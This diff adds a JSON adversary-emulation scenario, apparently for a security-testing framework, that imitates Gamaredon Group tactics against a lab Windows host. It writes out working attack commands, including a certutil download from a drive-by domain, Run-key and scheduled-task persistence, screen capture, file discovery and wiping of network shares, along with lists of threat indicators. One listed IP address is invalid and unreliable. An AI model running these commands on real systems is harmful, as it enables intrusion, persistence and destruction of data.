@@ -1,0 +1,642 @@
+{
+    "meta_data": {
+        "name": "gamaredon_group",
+        "version": "v1.0.0",
+        "title": "Gamaredon Group",
+        "description": "This scenario emulates tactics employed by Gamaredon Group. The attacker investigates a machine and performs invasive operations.",
+        "author": "Attack Content",
+        "suggested_duration": 1653
+    },
+    "procedures": [
+        {
+            "tactic": "Actuator",
+            "technique": "Infrastructure",
+            "label": "actuator",
+            "preconditions": {
+                "tool": "self.tool_name"
+            }
+        },
+        {
+            "tactic": "Interfaces",
+            "technique": "Infrastructure",
+            "label": "Interfaces",
+            "preconditions": {
+                "tool": "self.tool",
+                "exfil": "self.exfil",
+                "driveby": "self.driveby"
+            }
+        },
+        {
+            "tactic": "DNS",
+            "technique": "Infrastructure",
+            "label": "DNS",
+            "preconditions": {
+                "tool": "self.tool",
+                "exfil": "self.exfil",
+                "driveby": "self.driveby"
+            }
+        },
+        {
+            "tactic": "NGINX",
+            "technique": "Infrastructure",
+            "label": "NGINX",
+            "preconditions": {
+                "self.tool_name": "self.tool",
+                "payload": "self.payload_name",
+                "exfiltration": "self.exfil",
+                "driveby": "self.driveby",
+                "driveby_ctl": "self.chimera"
+            }
+        },
+        {
+            "tactic": "Interfaces",
+            "technique": "Infrastructure",
+            "label": "Interfaces2",
+            "preconditions": {
+                "driveby": "self.driveby2"
+            }
+        },
+        {
+            "tactic": "DNS",
+            "technique": "Infrastructure",
+            "label": "DNS2",
+            "preconditions": {
+                "driveby": "self.driveby2"
+            }
+        },
+        {
+            "tactic": "NGINX",
+            "technique": "Infrastructure",
+            "label": "NGINX2",
+            "preconditions": {
+                "payload": "self.tool_name2",
+                "driveby": "self.driveby2",
+                "driveby_ctl": "self.chimera"
+            }
+        },
+        {
+            "tactic": "PayloadCheapride",
+            "technique": "Infrastructure",
+            "label": "Payload",
+            "preconditions": {
+                "tool": "self.tool"
+            }
+        },
+        {
+            "tactic": "SpearPhishingAttachment",
+            "technique": "InitialAccess",
+            "label": "spearPhishingAttachment",
+            "preconditions": {
+                "actuator": "self.actuator",
+                "phishing": "self.phish_1",
+                "tool": "self.tool",
+                "driveby": "self.driveby",
+                "target": "self.target_1",
+                "body": "Discover a whole new world!"
+            }
+        },
+        {
+            "tactic": "DriveByCompromise",
+            "technique": "InitialAccess",
+            "label": "driveByCompromise",
+            "preconditions": {
+                "actuator": "self.actuator",
+                "tool": "self.tool",
+                "driveby": "self.driveby",
+                "target": "self.target_1"
+            }
+        },
+        {
+            "tactic": "UserExecution",
+            "technique": "Execution",
+            "label": "userExecution",
+            "preconditions": {
+                "actuator_id": "self.actuator",
+                "tool": "self.tool",
+                "driveby": "self.driveby",
+                "target": "self.target_1"
+            }
+        },
+        {
+            "tactic": "WebProtocols",
+            "technique": "c2",
+            "label": "webProtocols_1",
+            "preconditions": {
+                "actuator_id": "self.actuator",
+                "tool": "self.tool",
+                "driveby": "self.driveby",
+                "target": "self.target_1",
+                "tune": {
+                    "infra": true
+                }
+            }
+        },
+        {
+            "tactic": "SystemInformationDiscovery",
+            "technique": "Discovery",
+            "label": "systemInformationDiscovery1",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target": "self.target_1"
+            }
+        },
+        {
+            "tactic": "SystemOwnerUserDiscovery",
+            "technique": "Discovery",
+            "label": "systemOwnerUserDiscovery1",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target": "self.target_1",
+                "tune": {
+                    "command": "cmd /c whoami /upn"
+                }
+            }
+        },
+        {
+            "tactic": "IngressToolTransfer",
+            "technique": "c2",
+            "label": "ingressToolTransfer1",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target": "self.target_1",
+                "tune": {
+                    "command": {
+                        "template": [
+                            "cmd /c certutil.exe -urlcache -split -f http://",
+                            "self.driveby_domain2",
+                            "/",
+                            "self.tool_name2",
+                            " ",
+                            "self.temp_dir_name_1",
+                            "\\",
+                            "self.tool_name2",
+                            " && echo \" \""
+                        ]
+                    }
+                }
+            }
+        },
+        {
+            "tactic": "TaintSharedContent",
+            "technique": "LateralMovement",
+            "label": "taintSharedContent",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target_1": "self.target_1",
+                "target_2": "self.target_1",
+                "tune": {
+                    "command": {
+                        "template": [
+                            "powershell &{$fp = \"$($(Get-PSDrive | where{$_.DisplayRoot -match '\\\\'}).DisplayRoot)\"; robocopy ",
+                            "self.temp_dir_name_1",
+                            " $fp ",
+                            "self.tool_name2",
+                            "}"
+                        ]
+                    }
+                }
+            }
+        },
+        {
+            "tactic": "RegistryRunKeysStartupFolder",
+            "technique": "Persistence",
+            "label": "addRunRegistryKey",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target": "self.target_1",
+                "tune": {
+                    "command": {
+                        "template": [
+                            "powershell &{$command = quser; $string = Out-String -inputobject $command; $username = $string.split(\"`n>\")[2].split()[0]; echo \" \"; reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v MicrosoftOfficeUpdater /d C:\\Users\\$username\\AppData\\Local\\Temp\\",
+                            "self.tool_name2",
+                            " /f}"
+                        ]
+                    }
+                }
+            }
+        },
+        {
+            "tactic": "NativeApi",
+            "technique": "Execution",
+            "label": "nativeApi",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target": "self.target_1"
+            }
+        },
+        {
+            "tactic": "FileAndDirectoryDiscovery",
+            "technique": "Discovery",
+            "label": "fileAndDirectoryDiscovery",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target": "self.target_1",
+                "tune": {
+                    "command": "where /R C:\\Users *doc* *docx* *xls* *xlsx* && echo \" \""
+                }
+            }
+        },
+        {
+            "tactic": "ScheduledTaskExecution",
+            "technique": "Execution",
+            "label": "scheduledTaskExecution",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target": "self.target_1",
+                "tune": {
+                    "command": {
+                        "template": [
+                            "powershell &{$time = [DateTime]::Now.AddMinutes(30); $hourMinute = $time.ToString(\"HH:mm\"); $command = quser; $string = Out-String -inputobject $command; $username = $string.split(\"`n>\")[2].split()[0]; SchTasks.exe /Create /SC minute /TN \"deepmost\", /TR \"cmd /c ",
+                            "self.temp_dir_name_1",
+                            "\\",
+                            "self.tool_name2",
+                            " \" /ST $hourMinute /F}"
+                        ]
+                    }
+                }
+            }
+        },
+        {
+            "tactic": "ScreenCapture",
+            "technique": "Collection",
+            "label": "screenCapture",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target": "self.target_1",
+                "tune": {
+                    "command": "powershell $a = quser; $b = Out-String -inputobject $a; $user = $b.split(\"`n>\")[2].split()[0]; $dir = \"C:\\Users\\$user\\AppData\\Local\\TEMP\\ModeAuto\\icons\"; mkdir $dir 2>$null; $d = \"$dir\\2031-09-13-06-00.jpg\"; [void][reflection.assembly]::loadwithpartialname('system.windows.forms'); [system.windows.forms.sendkeys]::sendwait(\"{PRTSC}\"); $e = [System.Windows.Forms.Clipboard]::GetDataObject(); [System.Drawing.Bitmap]$e.getimage().Save($d, [System.Drawing.Imaging.ImageFormat]::Jpeg); echo \" \""
+                }
+            }
+        },
+        {
+            "tactic": "ProcessDiscovery",
+            "technique": "Discovery",
+            "label": "processDiscovery",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target": "self.target_1",
+                "tune": {
+                    "command": "cmd /c tasklist /svc | findstr wmphost.exe && echo ' '"
+                }
+            }
+        },
+        {
+            "tactic": "PeripheralDeviceDiscovery",
+            "technique": "Discovery",
+            "label": "peripheralDeviceDiscovery",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target": "self.target_1",
+                "tune": {
+                    "command": "powershell &{Get-PnpDevice | fl | findstr Caption; echo \" \"}"
+                }
+            }
+        },
+        {
+            "tactic": "MatchLegitimateNameOrLocation",
+            "technique": "DefenseEvasion",
+            "label": "matchLegitimateNameOrLocation",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target": "self.target_1",
+                "tune": {
+                    "command": "powershell $a = quser; $b = Out-String -inputobject $a; $user = $b.split(\"`n>\")[2].split()[0]; $dir = \"C:\\Users\\$user\\AppData\\Local\\IconsCache.db\"; systeminfo > $dir; echo \" \""
+                }
+            }
+        },
+        {
+            "tactic": "ExfiltrationOverC2Channel",
+            "technique": "Exfiltration",
+            "label": "exfiltrationOverC2Channel",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target": "self.target_1",
+                "tune": {
+                    "command": "powershell $a = quser; $b = Out-String -inputobject $a; $user = $b.split(\"`n>\")[2].split()[0]; $dir = \"C:\\Users\\$user\\AppData\\Local\"; gc $dir\\IconsCache.db; echo \" \""
+                }
+            }
+        },
+        {
+            "tactic": "FileDeletion",
+            "technique": "DefenseEvasion",
+            "label": "fileDeletionLocal",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target": "self.target_1",
+                "tune": {
+                    "command": "powershell &{$a = quser; $b = Out-String -inputobject $a; $user = $b.split(\"`n>\")[2].split()[0]; $dir = \"C:\\Users\\$user\\AppData\\Local\"; rm $dir\\IconsCache.db; echo \" \"}"
+                }
+            }
+        },
+        {
+            "tactic": "FileDeletionPowershell",
+            "technique": "DefenseEvasion",
+            "label": "fileDeletionShare",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target": "self.target_1",
+                "tune": {
+                    "command": "powershell &{$fp = \"$($(Get-PSDrive | where{$_.DisplayRoot -match '\\\\'}).DisplayRoot)\"; rm $fp\\*; echo \" \"}"
+                }
+            }
+        },
+        {
+            "tactic": "AgentExit",
+            "technique": "Utility",
+            "label": "AgentExit",
+            "preconditions": {
+                "agent": "self.agent_tgt1",
+                "tool": "self.tool",
+                "target": "self.target_1"
+            }
+        }
+    ],
+    "iocs": {
+        "domain": [
+            "admin-ru.ru",
+            "adobe.update-service.net",
+            "apploadapp.webhop.me",
+            "brokbridge.com",
+            "cat.gotdns.ch",
+            "check-update.ru",
+            "childrights.in.ua",
+            "conhost.myftp.org",
+            "docdownload.ddns.net",
+            "downloads.email-attachments.ru",
+            "downloads.file-attachments.ru",
+            "dyndownload.serveirc.com",
+            "e.muravej.ua",
+            "email-attachments.ru",
+            "file-attachments.ru",
+            "freefiles.myftp.biz",
+            "getmyfile.webhop.me",
+            "googlefiles.serveftp.com",
+            "grom56.ddns.net",
+            "grom90.ddns.net",
+            "hrome-update.ru",
+            "hrome-updater.ru",
+            "loaderskypetm.webhop.me",
+            "loadsoulip.serveftp.com",
+            "mail.file-attachments.ru",
+            "mails.redirectme.net",
+            "mars-ru.ru",
+            "msrestore.ru",
+            "oficialsite.webhop.me",
+            "parkingdoma.webhop.me",
+            "poligjong.webhop.me",
+            "polistar.ddns.net",
+            "proxy-spread.ru",
+            "rms.admin-ru.ru",
+            "samotsvety.com.ua",
+            "skypeemocache.ru",
+            "skypeupdate.ru",
+            "spbpool.ddns.net",
+            "spread-service.ru",
+            "spread-ss.ru",
+            "spread-updates.ru",
+            "stor.tainfo.com.ua",
+            "tortilla.sytes.net",
+            "ukrnet.serveftp.com",
+            "ukrway.galaktion.ru",
+            "umachka.ua",
+            "update-service.net",
+            "updatesp.ddns.net",
+            "updateviber.sytes.net",
+            "webclidie.webhop.me",
+            "win-restore.ru",
+            "winloaded.sytes.net",
+            "winupdateloader.ru",
+            "www.file-attachments.ru",
+            "www.win-restore.ru",
+            "yfperoliz.webhop.me"
+        ],
+        "ip": [
+            "176.119.147.225/24",
+            "176.57.215.115/24",
+            "54.0.2952.64/24",
+            "168.119.228.72/24",
+            "92.242.62.131/24",
+            "87.249.53.178/24",
+            "89.223.65.220/24",
+            "78.40.219.12/24",
+            "188.225.86.146/24",
+            "188.225.45.240/24",
+            "37.77.105.102/24",
+            "87.249.54.15/24",
+            "92.53.97.112/24",
+            "217.25.94.152/24",
+            "188.225.58.51/24",
+            "188.225.25.7/24",
+            "89.223.120.224/24",
+            "188.225.47.250/24",
+            "87.249.53.116/24",
+            "87.249.53.216/24",
+            "87.249.44.220/24",
+            "87.249.49.13/24",
+            "87.249.44.41/24",
+            "89.223.125.10/24"
+        ],
+        "binary": [
+            "ChkFlsh.exe",
+            "wmphost.exe",
+            "chrome-xvnc-v5517.exesetting.exe",
+            "AdapterTroubleshooter.exe",
+            "Cookies.exe",
+            "descend.exe",
+            "deep-sunken.exe",
+            "backed.exe",
+            "z4z05jn4.egf.exe",
+            "defiant.exe",
+            "deep-green.exe"
+        ]
+    },
+    "spec": {
+        "emaillist": "@('Janice Durham <janice.durham@site.com>', 'Darryl Richmond <darryl.richmond@site.com>', 'Nelda Rios <nelda.rios@site.com>', 'Joanna Wilkerson <joanna.wilkerson@site.com>')",
+        "phishing": {
+            "1": {
+                "ioc-server_addr": "200.200.200.201",
+                "from_addr": "darryl.richmond@site.com",
+                "to_addrs": "janice.durham@site.com",
+                "cc": "",
+                "bcc": "",
+                "subject": "COVID (Weekly Epi)",
+                "body_subtype": "plain",
+                "attach": "",
+                "username": "janice.durham",
+                "password": "",
+                "port": "25"
+            }
+        },
+        "tool": {
+            "1": {
+                "name": "cheapride_v1",
+                "beacon": "30",
+                "jitter": "90",
+                "ioc-ip_callback": "122.49.200.108/24",
+                "ioc-domain_callback": "inf0rm.bed1rcati.com",
+                "ioc-binary_payload_name": "form.doc.exe"
+            },
+            "2": {
+                "name": "netbugc.exe"
+            }
+        },
+        "chimera": {
+            "api-control_ip": "10.10.200.60"
+        },
+        "exfil": {
+            "1": {
+                "ioc-ip_exfil": "161.135.1.25/24",
+                "ioc-domain_exfil": "deepwalterhorizon.com"
+            }
+        },
+        "driveby": {
+            "1": {
+                "ioc-ip_driveby": "161.135.1.22/24",
+                "ioc-domain_driveby": "texaspumps.us"
+            },
+            "2": {
+                "ioc-ip_driveby": "157.32.19.24/24",
+                "ioc-domain_driveby": "arkansaspumps.us"
+            }
+        },
+        "targets": {
+            "1": {
+                "exfil_file": "file.doc",
+                "payload_destination": "C:\\Windows\\Temp",
+                "ioc-temp_dir": "C:\\Windows\\debug\\WIA",
+                "query": {
+                    "filter": {
+                        "hostname": "dev-win10-3"
+                    }
+                }
+            }
+        }
+    },
+    "preconditions": {
+        "state": {},
+        "initial": {
+            "tool_name": {
+                "path": [
+                    "tool",
+                    "1",
+                    "name"
+                ]
+            },
+            "tool_name2": {
+                "path": [
+                    "tool",
+                    "2",
+                    "name"
+                ]
+            },
+            "payload_name": {
+                "path": [
+                    "tool",
+                    "1",
+                    "ioc-binary_payload_name"
+                ]
+            },
+            "tool": {
+                "path": [
+                    "tool",
+                    "1"
+                ]
+            },
+            "exfil": {
+                "path": [
+                    "exfil",
+                    "1"
+                ]
+            },
+            "driveby": {
+                "path": [
+                    "driveby",
+                    "1"
+                ]
+            },
+            "driveby2": {
+                "path": [
+                    "driveby",
+                    "2"
+                ]
+            },
+            "driveby_domain": {
+                "path": [
+                    "driveby",
+                    "1",
+                    "ioc-domain_driveby"
+                ]
+            },
+            "driveby_domain2": {
+                "path": [
+                    "driveby",
+                    "2",
+                    "ioc-domain_driveby"
+                ]
+            },
+            "chimera": {
+                "path": [
+                    "chimera"
+                ]
+            },
+            "phish_1": {
+                "path": [
+                    "phishing",
+                    "1"
+                ]
+            },
+            "target_1": {
+                "path": [
+                    "targets",
+                    "1"
+                ]
+            },
+            "temp_dir_name_1": {
+                "path": [
+                    "targets",
+                    "1",
+                    "ioc-temp_dir"
+                ]
+            }
+        },
+        "effects": {
+            "actuator": {
+                "path": [
+                    "actuator",
+                    "actuator",
+                    "ret",
+                    "registered_id"
+                ],
+                "default": 0
+            },
+            "scenario_infrastructure": {
+                "path": [
+                    "infrastructure"
+                ]
+            },
+            "agent_tgt1": {
+                "path": [
+                    "webProtocols_1",
+                    "agent",
+                    "ret",
+                    "agent_id"
+                ]
+            }
+        }
+    }
+}
